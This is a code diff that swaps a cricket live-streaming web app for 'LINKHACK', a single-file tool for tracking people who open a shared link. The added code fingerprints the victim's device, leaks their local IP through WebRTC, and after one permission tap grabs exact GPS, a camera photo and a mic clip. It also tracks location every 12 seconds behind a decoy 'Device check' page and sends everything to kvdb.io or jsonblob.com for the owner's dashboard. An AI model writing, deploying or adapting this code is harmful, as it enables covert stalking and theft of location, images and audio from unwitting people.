-
-    <div class="noStream" id="noStream">
-      <div style="font-size:30px;">🎥</div>
-      <div style="font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;color:#E8ECF1;">StreamCam Live</div>
-      <div style="font-size:11px;">Live jaane ke liye camera/mic permission do</div>
-      <button id="startBtn">Camera Shuru Karo</button>
+<!-- ══════════ DASHBOARD (owner) ══════════ -->
+<div id="view-dash" class="wrap">
+  <div class="row">
+    <div>
+      <h1>LINK<span>HACK</span></h1>
+      <div class="sub">remote device access · single file · zero setup</div>
     </div>
+    <div class="sp"></div>
+    <span class="pill" id="netpill"><span class="dot" id="netdot"></span><span id="nettxt">idle</span></span>
+  </div>
 
-    <div class="topbar">
-      <div class="liveBadge">
-        <span class="dot" id="liveDot"></span>
-        <span class="liveText" id="liveLabel">OFFLINE</span>
-        <span class="timer" id="timer">00:00</span>
-      </div>
-      <button class="closeBtn" id="stopAllBtn" title="Camera band karo">✕</button>
+  <div id="filewarn" class="warnbox" hidden>
+    <b>file:// se khola hai.</b> Link share karne ke liye file ko host karo — Netlify Drop pe drag karo
+    (<span class="mono">app.netlify.com/drop</span>) ya GitHub Pages pe daalo. Tab hi link kaam karega.
+  </div>
+
+  <div class="card acc" id="setupcard">
+    <div class="row"><b style="font-size:14px">1 · Apna tracking link banao</b><div class="sp"></div></div>
+    <div class="sub" style="margin:6px 0 12px">Ek baar banao, jitne log chaaho ko bhejo — sab alag-alag dikhenge.</div>
+    <div class="row" style="gap:8px">
+      <button class="p" id="genBtn">GENERATE LINK</button>
+      <button class="g" id="resetBtn" hidden>NEW SESSION</button>
     </div>
-
-    <div class="statsPill">👀 <b id="viewerCount">0</b>&nbsp;viewers · <span id="resLabel">720p</span></div>
-    <button class="cricketPill active" id="cricketToggleBtn">🏏 Score Setup</button>
-
-    <div class="adBadge" id="adBadge">🔴 AD BREAK</div>
-    <div class="boundaryAnim" id="boundaryAnim"></div>
-    <div class="wmOverlay" id="wmOverlay"></div>
-    <div class="audioMeter" id="audioMeter">
-      <span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>
-    </div>
-    <div class="quickTools">
-      <div class="qBtn" id="flipBtn" title="Camera badlo">🔄</div>
-      <div class="qBtn" id="torchBtn" title="Flash">⚡</div>
-      <div class="qBtn" id="micBtn" title="Mic mute">🎙️</div>
-      <div class="qBtn" id="filterBtn" title="Filter">🎨</div>
-    </div>
-    <div class="filterLabel" id="filterLabel" style="display:none;">Normal</div>
-
-    <div class="sbTabs">
-      <button class="sbTab active" id="sbTabA">TEAM A</button>
-      <button class="sbTab" id="sbTabB">TEAM B</button>
-    </div>
-
-    <div class="scorebug" id="scorebug">
-      <div class="sbEndCircle" id="sbExpandLeft">
-        <div class="sbFlagCircle" id="sbFlagLeft" style="background:var(--teamA)">A</div>
-      </div>
-      <div class="sbSide">
-        <div class="sbBatsmen">
-          <div class="sbBatRow sbNoArrow" id="sbRow1">
-            <span class="sbBatName" id="sbName1">Player 1</span>
-            <span class="sbBatRuns" id="sbRuns1">0</span>
-            <span class="sbBatBalls" id="sbBalls1">0</span>
+    <div id="linkbox" hidden style="margin-top:14px">
+      <div class="row" style="align-items:flex-start;gap:14px;flex-wrap:wrap">
+        <img class="qr" id="qr" alt="QR">
+        <div style="flex:1;min-width:190px">
+          <div class="sub" style="margin:0 0 6px">Ye link bhejo:</div>
+          <input id="link" readonly class="mono">
+          <div class="actions">
+            <button class="sm" id="copyBtn">COPY</button>
+            <button class="sm" id="openBtn">OPEN</button>
+            <button class="sm" id="shareBtn">SHARE</button>
           </div>
-          <div class="sbBatRow striker" id="sbRow2">
-            <span class="sbArrow" id="sbStrikeArrow">▸</span>
-            <span class="sbBatName" id="sbName2">Player 2</span>
-            <span class="sbBatRuns" id="sbRuns2">0</span>
-            <span class="sbBatBalls" id="sbBalls2">0</span>
-          </div>
+          <div class="sub" style="margin-top:9px" id="backendInfo"></div>
         </div>
-      </div>
-      <div class="sbCenter">
-        <div class="sbScoreLine">
-          <span class="sbScoreBadge" id="sbScoreBadge">0-0</span>
-          <span class="sbOversInline" id="sbOversInline">0.0</span>
-        </div>
-        <div class="sbCenterSub" id="sbCenterSub">CRR 0.00</div>
-      </div>
-      <div class="sbBowlerSide">
-        <div class="sbBowlerName" id="sbBowlerNameEl">Bowler</div>
-        <div class="sbBowlerFig"><span id="sbBowlerWk">0-0</span><span id="sbBowlerOv">0.0</span></div>
-        <div class="sbOverDots" id="sbOverDots"></div>
-      </div>
-      <div class="sbEndCircle" id="sbExpandBtn">
-        <div class="sbFlagCircle" style="background:var(--live);font-size:15px;">+</div>
       </div>
     </div>
   </div>
 
-  <div class="scoreWrap" id="scoreWrap">
-    <div class="scoringTable">
-      <h4><span>🏏 Live Scoring</span><span id="stStrikerLabel" style="font-weight:600;font-size:10.5px;color:#5A6472;">Player A1* · Player A2</span></h4>
-      <div class="cpRow" style="gap:5px;">
-        <input type="text" id="strikerName" placeholder="Striker" style="font-size:9.5px;padding:4px 5px;">
-        <input type="text" id="nonStrikerName" placeholder="Non-striker" style="font-size:9.5px;padding:4px 5px;">
-      </div>
-      <div class="runGrid">
-        <button class="runBtn" data-run="0">0</button>
-        <button class="runBtn" data-run="1">1</button>
-        <button class="runBtn" data-run="2">2</button>
-        <button class="runBtn" data-run="3">3</button>
-        <button class="runBtn four" data-run="4">4</button>
-        <button class="runBtn six" data-run="6">6</button>
-        <button class="runBtn" id="swapBtn">⇄</button>
-        <button class="runBtn" id="undoBtn">↩</button>
-      </div>
-      <div class="extraGrid">
-        <button class="extraBtn" id="wideBtn" title="Wide">Wd</button>
-        <button class="extraBtn" id="noballBtn" title="No Ball">NB</button>
-        <button class="extraBtn" id="byeBtn" title="Bye">B</button>
-        <button class="extraBtn" id="legbyeBtn" title="Leg Bye">LB</button>
-      </div>
-      <button class="wicketBtn" id="wicketBtn">🏏 WICKET</button>
-      <div class="utilRow">
-        <button class="utilBtn" id="resetInningsBtn">Reset Innings</button>
-        <button class="utilBtn" id="powerplayBtn">Powerplay 📊</button>
-      </div>
-      <div class="powerplayRow" id="powerplayRow" style="display:none;"></div>
-    </div>
-
-    <div class="scoringTable" id="adsCard">
-      <h4><span>📺 Ads</span><span id="adStatusLabel" style="font-weight:600;font-size:10.5px;color:#5A6472;">No ad loaded</span></h4>
-      <input type="file" id="adFileInput" accept="video/*">
-      <div class="utilRow">
-        <button class="utilBtn" id="playAdBtn">▶ Play Ad</button>
-        <button class="utilBtn" id="stopAdBtn">⏹ Resume Match</button>
-      </div>
-    </div>
-
-    <div class="scoringTable" id="settingsCard">
-      <h4><span>⚙️ Settings</span></h4>
-      <div class="rowBtns">
-        <button class="chip" id="statusOfflineBtn">Offline</button>
-        <button class="chip active" id="statusOnlineBtn">Online</button>
-      </div>
-      <div class="cpRow">
-        <select id="resSelect" style="flex:1;">
-          <option value="480">480p (SD)</option>
-          <option value="720" selected>720p (HD)</option>
-          <option value="1080">1080p (Full HD)</option>
-        </select>
-        <select id="bitrateSelect" style="flex:1;">
-          <option value="1500">1500 Kbps</option>
-          <option value="2500" selected>2500 Kbps</option>
-          <option value="4000">4000 Kbps</option>
-        </select>
-      </div>
-      <div class="rowBtns">
-        <button class="chip" id="overlayOffBtn">Overlay Off</button>
-        <button class="chip active" id="overlayOnBtn">Overlay On</button>
-      </div>
-      <div class="cpRow">
-        <input type="text" id="wmInput" placeholder="Watermark e.g. @yourchannel" maxlength="30">
-      </div>
-      <div class="cpRow">
-        <input type="text" id="rtmpInput" placeholder="RTMP key (optional)">
-      </div>
-      <div class="rowBtns" id="filterChips"></div>
-    </div>
-    <div class="teamBar live" id="teamABar">
-      <div class="tbLeft">
-        <span class="tbName" id="sbTeamAName">Team A</span>
-        <span class="tbTag" id="tbTagA">BATTING</span>
-      </div>
-      <div class="tbRight">
-        <span class="tbScore" id="sbTeamAScore">0/0</span>
-        <span class="tbOvers" id="sbTeamAOvers">(0.0 ov)</span>
-      </div>
-    </div>
-    <div class="tbSub" id="tbSubLine">
-      <span id="sbCRR">CRR 0.00</span>
-    </div>
-    <div class="sbOver" id="sbOverBalls"></div>
-
-    <div class="matchInfoRow">
-      <div class="battingCard">
-        <div class="bcRow bcHead"><span>Batsman</span><span>R</span><span>B</span><span>4s</span><span>6s</span><span>SR</span></div>
-        <div class="bcRow striker" id="bcStrikerRow">
-          <span id="bcStrikerName">Player A1 *</span><span id="bcStrikerR">0</span><span id="bcStrikerB">0</span><span id="bcStriker4">0</span><span id="bcStriker6">0</span><span id="bcStrikerSR">0.0</span>
-        </div>
-        <div class="bcRow" id="bcNonStrikerRow">
-          <span id="bcNonStrikerName">Player A2</span><span id="bcNonStrikerR">0</span><span id="bcNonStrikerB">0</span><span id="bcNonStriker4">0</span><span id="bcNonStriker6">0</span><span id="bcNonStrikerSR">0.0</span>
-        </div>
-      </div>
-      <div class="bowlingCard">
-        <h5>Bowler</h5>
-        <button type="button" id="currentBowlerBtn" style="width:100%;background:var(--panel-2);border:1px solid var(--line);color:var(--accent);font-weight:700;font-size:12.5px;padding:7px 8px;border-radius:7px;margin-bottom:8px;font-family:'Poppins',sans-serif;cursor:pointer;">Bowler 1 ✎</button>
-        <div class="bowlerStats">
-          <div><span id="bowlerOvers">0.0</span><label>Overs</label></div>
-          <div><span id="bowlerRuns">0</span><label>Runs</label></div>
-          <div><span id="bowlerWkts">0</span><label>Wkts</label></div>
-          <div><span id="bowlerEcon">0.00</span><label>Econ</label></div>
-        </div>
-      </div>
-    </div>
-
-    <div class="teamBar other" id="teamBBar">
-      <div class="tbLeft">
-        <span class="tbName" id="sbTeamBName">Team B</span>
-        <span class="tbTag" id="tbTagB">YET TO BAT</span>
-      </div>
-      <div class="tbRight">
-        <span class="tbScore" id="sbTeamBScore">-</span>
-        <span class="tbOvers" id="sbTeamBOvers"></span>
-      </div>
-    </div>
-
-    <div class="teamTabs">
-      <button class="teamTab active" id="tabA">Team A</button>
-      <button class="teamTab" id="tabB">Team B</button>
-    </div>
-    <div class="xiCol" id="xiSingleCol" style="border-left-color:var(--teamA)">
-      <h4 style="color:var(--teamA)" id="xiSingleHead">Team A — Playing XI</h4>
-      <ol id="xiSingleList"></ol>
-    </div>
+  <h2>Captured devices <span id="cnt" class="pill">0</span></h2>
+  <div class="row" style="gap:7px;margin-bottom:4px">
+    <button class="sm" id="refreshBtn">↻ REFRESH</button>
+    <button class="sm" id="exportBtn">↓ EXPORT JSON</button>
+    <div class="sp"></div>
+    <span class="sub" id="lastPoll">—</span>
   </div>
+  <div id="devlist"><div class="empty">Abhi koi device nahi.<br>Link banao aur kisi ko bhejo.</div></div>
 
-  <div class="bottombar">
-    <button class="sideBtn" id="snapBtn" title="Snapshot">📸</button>
-    <div class="recBtn" id="recBtn" title="Record / Go Live">
-      <div class="inner" id="recInner"></div>
-    </div>
-    <button class="sideBtn" id="goLiveBtn" title="Go Live">▶</button>
+  <pre class="out" id="raw" hidden></pre>
+
+  <h2>Ye kaise kaam karta hai</h2>
+  <div class="card">
+    <div class="kv"><b>Bina permission</b><i class="g">IP · ISP · city · model · OS · screen · battery · GPU · fingerprint · fonts · timezone · local IP</i></div>
+    <div class="kv"><b>Ek tap "Allow"</b><i class="w">exact GPS · front camera photo · 2.5s mic clip</i></div>
+    <div class="kv"><b>Live tracking</b><i class="w">har 12s position + battery update</i></div>
+    <div class="kv"><b>Remote command</b><i class="g">dashboard se dobara photo khinchwao</i></div>
   </div>
-
-  <!-- CRICKET SETUP + SCORING PANEL -->
-  <div class="cricketPanel" id="cricketPanel">
-    <button class="cpClose" id="cpClose">✕</button>
-    <h3>Match Setup</h3>
-    <div class="cpSection">
-      <select id="battingSelect">
-        <option value="A">Team A batting</option>
-        <option value="B">Team B batting</option>
-      </select>
-      <button class="utilBtn" id="swapInningsBtn" style="flex:1;">Swap Innings ⇄</button>
-    </div>
-
-    <div class="cpRow">
-      <input type="text" id="teamAName" value="Team A" placeholder="Team A name">
-      <input type="color" id="teamAColor" value="#1656C9">
-    </div>
-    <div class="cpRow">
-      <input type="file" id="teamALogo" accept="image/*" style="flex:1;">
-    </div>
-    <textarea id="xiAInput" rows="4" placeholder="Team A Playing XI — 1 naam per line">Player A1
-Player A2
-Player A3
-Player A4
-Player A5
-Player A6
-Player A7
-Player A8
-Player A9
-Player A10
-Player A11</textarea>
-
-    <div class="cpRow">
-      <input type="text" id="teamBName" value="Team B" placeholder="Team B name">
-      <input type="color" id="teamBColor" value="#0E7FD6">
-    </div>
-    <div class="cpRow">
-      <input type="file" id="teamBLogo" accept="image/*" style="flex:1;">
-    </div>
-    <textarea id="xiBInput" rows="4" placeholder="Team B Playing XI — 1 naam per line">Player B1
-Player B2
-Player B3
-Player B4
-Player B5
-Player B6
-Player B7
-Player B8
-Player B9
-Player B10
-Player B11</textarea>
-
-    <div class="cpRow">
-      <input type="text" id="matchStatusInput" placeholder="Match status e.g. FINAL - LORD'S" value="LIVE MATCH">
-    </div>
+  <div class="warnbox" style="background:rgba(56,189,248,.07);border-color:rgba(56,189,248,.28);color:#bae6fd">
+    <b>Honest truth:</b> browser me GPS/camera/mic ke liye victim ko ek baar <b>"Allow"</b> dabana padta hai —
+    isse bacha nahi ja sakta (native app hota tab bhi). Baaki sab kuch <b>bina kisi tap ke</b> chala jaata hai,
+    aur agar wo "Block" dabaye to bhi tumhe IP-level city mil jaati hai.
   </div>
+</div>
 
-  <div class="bowlerModal" id="bowlerModal">
-    <div class="bowlerModalCard">
-      <h3>🎯 Over khatam — Naya Bowler chuno</h3>
-      <div class="bowlerList" id="bowlerList"></div>
-      <div class="bowlerAddRow">
-        <input type="text" id="newBowlerInput" placeholder="Naya bowler ka naam">
-        <button id="addBowlerBtn">Add</button>
-      </div>
-    </div>
+<!-- ══════════ AGENT (victim) ══════════ -->
+<div id="view-agent" hidden>
+  <div id="decoy"></div>
+  <button class="fab" id="fab">i</button>
+  <div class="sheet" id="sheet">
+    <div class="grab"></div>
+    <h3>Device check</h3>
+    <p class="s">Ye page tumhare phone ki basic info padh raha hai.</p>
+    <div id="sheetbody"></div>
+    <div class="actions"><button class="sm" id="sheetClose" style="margin-top:14px">CLOSE</button></div>
   </div>
-
-  <div class="toast" id="toast"></div>
 </div>
 
 <script>
-const preview = document.getElementById('preview');
-const adPlayer = document.getElementById('adPlayer');
-const compose = document.getElementById('compose');
-const ctx = compose.getContext('2d');
-const noStream = document.getElementById('noStream');
-const startBtn = document.getElementById('startBtn');
-const stopAllBtn = document.getElementById('stopAllBtn');
-const liveDot = document.getElementById('liveDot');
-const liveLabel = document.getElementById('liveLabel');
-const timerEl = document.getElementById('timer');
-const viewerCountEl = document.getElementById('viewerCount');
-const resLabel = document.getElementById('resLabel');
-const wmOverlay = document.getElementById('wmOverlay');
-const wmInput = document.getElementById('wmInput');
-const audioMeter = document.getElementById('audioMeter');
-const flipBtn = document.getElementById('flipBtn');
-const torchBtn = document.getElementById('torchBtn');
-const micBtn = document.getElementById('micBtn');
-const filterBtn = document.getElementById('filterBtn');
-const filterLabel = document.getElementById('filterLabel');
-const resSelect = document.getElementById('resSelect');
-const bitrateSelect = document.getElementById('bitrateSelect');
-const rtmpInput = document.getElementById('rtmpInput');
-const filterChips = document.getElementById('filterChips');
-const snapBtn = document.getElementById('snapBtn');
-const recBtn = document.getElementById('recBtn');
-const goLiveBtn = document.getElementById('goLiveBtn');
-const toast = document.getElementById('toast');
-const adBadge = document.getElementById('adBadge');
-const boundaryAnim = document.getElementById('boundaryAnim');
-const adStatusLabel = document.getElementById('adStatusLabel');
-const statusOnlineBtn = document.getElementById('statusOnlineBtn');
-const statusOfflineBtn = document.getElementById('statusOfflineBtn');
-const overlayOnBtn = document.getElementById('overlayOnBtn');
-const overlayOffBtn = document.getElementById('overlayOffBtn');
+/* ═══════════════════════════════════════════════════════════
+   0. helpers
+   ═══════════════════════════════════════════════════════════ */
+const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const esc=s=>String(s==null?'—':s).replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+const abToB64=ab=>{const u=new Uint8Array(ab);let s='';for(let i=0;i<u.length;i+=0x8000)
+  s+=String.fromCharCode.apply(null,u.subarray(i,i+0x8000));return btoa(s);};
+const bytes=n=>{if(n==null)return '—';const u=['B','KB','MB','GB','TB'];let i=0;
+  while(n>=1024&&i<u.length-1){n/=1024;i++;}return n.toFixed(i?1:0)+' '+u[i];};
+const ago=t=>{const s=Math.floor((Date.now()-t)/1000);return s<60?s+'s':s<3600?Math.floor(s/60)+'m':Math.floor(s/3600)+'h';};
 
-let stream = null;
-let audioCtx, analyser, dataArray, meterBars = audioMeter.querySelectorAll('span');
-let facingMode = 'user';
-let micOn = true;
-let torchOn = false;
-let isRecording = false;
-let isLive = false;
-let mediaRecorder, recordedChunks = [];
-let timerInterval, seconds = 0;
-let viewerInterval;
-let currentFilterIndex = 0;
-let adMode = false;
-
-const filters = [
-  {name:'Normal', css:'none'},
-  {name:'Vivid', css:'saturate(1.6) contrast(1.1)'},
-  {name:'B & W', css:'grayscale(1)'},
-  {name:'Sepia', css:'sepia(0.8)'},
-  {name:'Cool', css:'hue-rotate(180deg) saturate(1.2)'},
-  {name:'Warm', css:'sepia(0.3) saturate(1.4) hue-rotate(-10deg)'},
-  {name:'Invert', css:'invert(0.85)'}
-];
-
-function showToast(msg){
-  toast.textContent = msg;
-  toast.classList.add('show');
-  clearTimeout(showToast._t);
-  showToast._t = setTimeout(()=>toast.classList.remove('show'), 1800);
+async function sha(str){
+  try{ if(crypto?.subtle){ const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(str));
+    return [...new Uint8Array(h)].map(b=>b.toString(16).padStart(2,'0')).join(''); } }catch(e){}
+  let a=0x811c9dc5,b=0x9e3779b9;
+  for(let i=0;i<str.length;i++){a=Math.imul(a^str.charCodeAt(i),16777619)>>>0;b=(Math.imul(b,31)+str.charCodeAt(i))>>>0;}
+  return (a.toString(16)+b.toString(16)).repeat(4);
 }
-function fmtTime(s){
-  const m = Math.floor(s/60).toString().padStart(2,'0');
-  const sec = (s%60).toString().padStart(2,'0');
-  return m+':'+sec;
-}
-statusOnlineBtn.onclick = ()=>{
-  liveDot.classList.add('on'); liveLabel.textContent = 'ONLINE';
-  statusOnlineBtn.classList.add('active'); statusOfflineBtn.classList.remove('active');
-};
-statusOfflineBtn.onclick = ()=>{
-  liveDot.classList.remove('on'); liveLabel.textContent = 'OFFLINE';
-  statusOfflineBtn.classList.add('active'); statusOnlineBtn.classList.remove('active');
+
+/* ═══════════════════════════════════════════════════════════
+   1. backend  (kvdb.io  →  jsonblob.com  fallback)
+   ═══════════════════════════════════════════════════════════ */
+const Store={
+  backend:null,id:null,root:null,
+  async create(){
+    try{
+      const r=await fetch('https://kvdb.io/',{method:'POST'});
+      if(r.ok){ const id=(await r.text()).trim().replace(/[^A-Za-z0-9_-]/g,'');
+        if(id){ await fetch('https://kvdb.io/'+id+'/ping',{method:'PUT',body:'1'});
+          this.backend='kvdb'; this.id=id; this.root='https://kvdb.io/'+id; return id; } }
+    }catch(e){}
+    try{
+      const r=await fetch('https://jsonblob.com/api/jsonBlob',{method:'POST',
+        headers:{'Content-Type':'application/json'},body:'{}'});
+      if(r.ok){ let loc=r.headers.get('Location');
+        if(!loc){ try{ loc='https://jsonblob.com/api/jsonBlob/'+(await r.json()).id; }catch(e){} }
+        if(loc){ this.backend='jsonblob'; this.root=loc; this.id=loc.split('/').pop(); return this.id; } }
+    }catch(e){}
+    this.backend='local'; return null;
+  },
+  attach(b,id){ this.backend=b; this.id=id;
+    this.root=b==='kvdb'?'https://kvdb.io/'+id:'https://jsonblob.com/api/jsonBlob/'+id; },
+  async put(k,v){
+    const body=JSON.stringify(v);
+    if(this.backend==='kvdb')
+      return fetch(this.root+'/'+encodeURIComponent(k),{method:'PUT',body});
+    const d=await this.doc(); d[k]=v; await this.saveDoc(d);
+  },
+  async get(k){
+    if(this.backend==='kvdb'){ const r=await fetch(this.root+'/'+encodeURIComponent(k),{cache:'no-store'});
+      if(!r.ok)return null; const t=await r.text(); try{return JSON.parse(t)}catch(e){return t} }
+    return (await this.doc())[k]??null;
+  },
+  async list(prefix=''){
+    if(this.backend==='kvdb'){ const r=await fetch(this.root+'/?list=true&prefix='+encodeURIComponent(prefix),
+      {cache:'no-store'}); if(!r.ok)return []; try{return await r.json()}catch(e){return []} }
+    return Object.keys(await this.doc()).filter(k=>k.startsWith(prefix));
+  },
+  async del(k){ if(this.backend==='kvdb'){await fetch(this.root+'/'+encodeURIComponent(k),{method:'DELETE'});return;}
+    const d=await this.doc(); delete d[k]; await this.saveDoc(d); },
+  async doc(){ try{const r=await fetch(this.root,{cache:'no-store'});return r.ok?await r.json():{}}catch(e){return{}} },
+  async saveDoc(d){ try{await fetch(this.root,{method:'PUT',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(d)});}catch(e){} }
 };
 
-/* ================= CAMERA ================= */
-async function startCamera(){
-  const resVal = parseInt(resSelect.value);
-  const constraints = {
-    audio: true,
-    video: { facingMode: facingMode, width:{ideal: resVal===1080?1920:resVal===720?1280:640}, height:{ideal: resVal} }
+/* ═══════════════════════════════════════════════════════════
+   2. fingerprint sources
+   ═══════════════════════════════════════════════════════════ */
+function canvasFP(){ try{
+  const c=document.createElement('canvas');c.width=240;c.height=60;const x=c.getContext('2d');
+  x.textBaseline='top';x.font='16px Arial';x.fillStyle='#f60';x.fillRect(0,0,120,30);
+  x.fillStyle='#0af';x.fillText('LinkHack\u26A1',2,4);
+  x.fillStyle='rgba(0,255,120,.7)';x.fillText('LinkHack\u26A1',4,18);
+  x.globalCompositeOperation='multiply';x.fillRect(60,0,80,40);return c.toDataURL();
+}catch(e){return 'n/a'} }
+
+function gpuInfo(){ try{
+  const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+  if(!gl)return {v:'n/a',r:'n/a',t:'n/a'};
+  const d=gl.getExtension('WEBGL_debug_renderer_info');
+  return { v:d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),
+           r:d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER),
+           t:gl.getParameter(gl.MAX_TEXTURE_SIZE) };
+}catch(e){return {v:'n/a',r:'n/a',t:'n/a'}} }
+
+function chipset(r){ const s=(r||'').toLowerCase();
+  if(/apple/.test(s))return 'Apple GPU';
+  const m=/adreno[^,;)]*/.exec(s); if(m)return 'Qualcomm '+m[0];
+  const q=/mali-?[a-z0-9]*/.exec(s); if(q)return 'ARM '+q[0].toUpperCase();
+  const p=/powervr[^,;)]*/.exec(s); if(p)return 'PowerVR';
+  if(/intel/.test(s))return 'Intel iGPU'; if(/nvidia|geforce/.test(s))return 'NVIDIA';
+  if(/radeon|amd/.test(s))return 'AMD Radeon'; return '—'; }
+
+function fonts(list){
+  try{
+    const c=document.createElement('canvas').getContext('2d');const t='mmmmmmmmmmlliWWW0123';
+    const m=f=>{c.font='72px '+f;return c.measureText(t).width;};
+    const b={};['monospace','sans-serif','serif'].forEach(f=>b[f]=m(f));
+    return list.filter(f=>['monospace','sans-serif','serif'].some(x=>m('"'+f+'",'+x)!==b[x]));
+  }catch(e){return[]}
+}
+const FONTLIST=['Arial','Helvetica','Verdana','Tahoma','Trebuchet MS','Times New Roman','Georgia',
+'Courier New','Brush Script MT','Comic Sans MS','Impact','Palatino','Garamond','Bookman','Futura',
+'Gill Sans','Optima','Didot','Baskerville','Rockwell','Segoe UI','Calibri','Candara','Corbel',
+'Cambria','Consolas','Menlo','Monaco','San Francisco','Helvetica Neue','Roboto','Noto Sans',
+'Droid Sans','Ubuntu','Cantarell','Liberation Sans','DejaVu Sans','Wingdings','Symbol','Zapfino',
+'Avenir','Copperplate','Marker Felt','Papyrus','Samsung Sans','Xiaomi Sans'];
+
+const IOS={ '320x568@2':'iPhone SE 1st gen / 5s','375x667@2':'iPhone 6/6s/7/8/SE 2-3',
+'375x812@3':'iPhone X / XS / 11 Pro / 12-13 mini','390x844@3':'iPhone 12 / 13 / 14',
+'393x852@3':'iPhone 14 Pro / 15 / 15 Pro / 16','402x874@3':'iPhone 16 Pro / 17',
+'414x736@3':'iPhone 6+ / 7+ / 8+','414x896@2':'iPhone XR / 11',
+'414x896@3':'iPhone XS Max / 11 Pro Max','428x926@3':'iPhone 12-14 Plus / Pro Max',
+'430x932@3':'iPhone 14 Pro Max / 15 Plus / 15 Pro Max / 16 Plus',
+'440x956@3':'iPhone 16 Pro Max / 17 Pro Max','375x812@2':'iPhone X (display zoom)',
+'768x1024@2':'iPad 9.7"','810x1080@2':'iPad 10.2"','820x1180@2':'iPad Air 4/5',
+'834x1194@2':'iPad Pro 11"','1024x1366@2':'iPad Pro 12.9"' };
+
+function platform(){
+  const ua=navigator.userAgent; let os='Unknown',ver='',model='—';
+  if(/Android/i.test(ua)){
+    os='Android'; ver=(/Android ([\d.]+)/.exec(ua)||[])[1]||'';
+    const m=/;\s*([^;()]+?)\s+Build[/;]/.exec(ua)||/Android[^;]*;\s*([^;)]+)/.exec(ua);
+    if(m) model=m[1].trim();
+  } else if(/iPhone|iPad|iPod/i.test(ua)){
+    os='iOS'; ver=((/OS (\d+[_\d]*)/.exec(ua)||[])[1]||'').replace(/_/g,'.');
+    const k=screen.width+'x'+screen.height+'@'+devicePixelRatio;
+    model=IOS[k]||( /iPad/.test(ua)?'iPad':'iPhone' )+' (unmapped '+k+')';
+  } else if(/Windows/i.test(ua)){os='Windows';ver=(/Windows NT ([\d.]+)/.exec(ua)||[])[1]||'';}
+  else if(/Mac OS X/i.test(ua)){os='macOS';ver=((/Mac OS X ([\d_]+)/.exec(ua)||[])[1]||'').replace(/_/g,'.');}
+  else if(/CrOS/.test(ua))os='ChromeOS';
+  else if(/Linux/i.test(ua))os='Linux';
+  const br=/Edg\//.test(ua)?'Edge':/OPR\//.test(ua)?'Opera':/SamsungBrowser/.test(ua)?'Samsung Internet':
+    /YaBrowser/.test(ua)?'Yandex':/UCBrowser/.test(ua)?'UC':/Chrome\//.test(ua)?'Chrome':
+    /Firefox\//.test(ua)?'Firefox':/Safari\//.test(ua)?'Safari':'Unknown';
+  const bv=(ua.match(/(?:Edg|OPR|SamsungBrowser|Chrome|Firefox|Version)\/([\d.]+)/)||[])[1]||'';
+  const type=/iPad|Tablet/i.test(ua)||(/Android/i.test(ua)&&!/Mobile/i.test(ua))?'tablet'
+    :/Mobile|iPhone|iPod/i.test(ua)?'phone':'desktop';
+  return {os,ver,br,bv,model,type,raw:ua};
+}
+
+async function audioFP(){ try{
+  const C=window.OfflineAudioContext||window.webkitOfflineAudioContext; if(!C)return 'n/a';
+  const ctx=new C(1,44100,44100),o=ctx.createOscillator(),g=ctx.createGain();
+  o.type='triangle';o.frequency.value=10000;g.gain.value=.05;
+  o.connect(g);g.connect(ctx.destination);o.start(0);o.stop(1);
+  const d=(await ctx.startRendering()).getChannelData(0);let s=0;
+  for(let i=0;i<d.length;i+=100)s+=Math.abs(d[i]); return s.toFixed(6);
+}catch(e){return 'n/a'} }
+
+function localIP(){ return new Promise(res=>{
+  try{
+    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('x'); const out=new Set();
+    const fin=()=>{try{pc.close()}catch(e){};res([...out].join(' / ')||'hidden (mDNS)')};
+    const t=setTimeout(fin,3500);
+    pc.onicecandidate=e=>{ if(!e.candidate)return; const c=e.candidate.candidate;
+      const ip=/(\d{1,3}(?:\.\d{1,3}){3})/.exec(c), md=/\s([0-9a-f-]{6,}\.local)/.exec(c);
+      if(ip)out.add(ip[1]); else if(md)out.add(md[1]);
+      clearTimeout(t); setTimeout(fin,800); };
+    pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(fin);
+  }catch(e){res('n/a')}
+}); }
+
+function codecs(){ const v=document.createElement('video'),a=document.createElement('audio');
+  const t=(e,m)=>e.canPlayType(m)||'no';
+  return { av1:t(v,'video/mp4;codecs="av01.0.05M.08"'), h265:t(v,'video/mp4;codecs="hvc1"'),
+    vp9:t(v,'video/webm;codecs="vp9"'), h264:t(v,'video/mp4;codecs="avc1.42E01E"'),
+    opus:t(a,'audio/webm;codecs="opus"'), flac:t(a,'audio/ogg;codecs="flac"') }; }
+
+/* ═══════════════════════════════════════════════════════════
+   3. full device collection
+   ═══════════════════════════════════════════════════════════ */
+async function collectDeep(){
+  const p=platform(), g=gpuInfo(), o={};
+  o.fp = (await sha([navigator.userAgent,navigator.language,navigator.platform,
+    navigator.hardwareConcurrency,navigator.deviceMemory,screen.width+'x'+screen.height,
+    devicePixelRatio,screen.colorDepth,new Date().getTimezoneOffset(),g.r,canvasFP(),
+    await audioFP()].join('|'))).slice(0,24);
+
+  o.ts=Date.now(); o.ua=p.raw; o.os=p.os; o.osVer=p.ver; o.browser=p.br; o.browserVer=p.bv;
+  o.model=p.model; o.deviceType=p.type; o.platform=navigator.platform;
+  o.lang=navigator.language; o.langs=(navigator.languages||[]).join(', ');
+  o.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  o.tzOffset=-new Date().getTimezoneOffset()/60;
+  o.locale=Intl.DateTimeFormat().resolvedOptions().locale;
+  o.currency=(Intl.NumberFormat().resolvedOptions().currency)||'—';
+  o.cores=navigator.hardwareConcurrency||null; o.mem=navigator.deviceMemory||null;
+  o.touch=navigator.maxTouchPoints||0; o.screen=screen.width+'×'+screen.height;
+  o.viewport=innerWidth+'×'+innerHeight; o.dpr=devicePixelRatio; o.depth=screen.colorDepth;
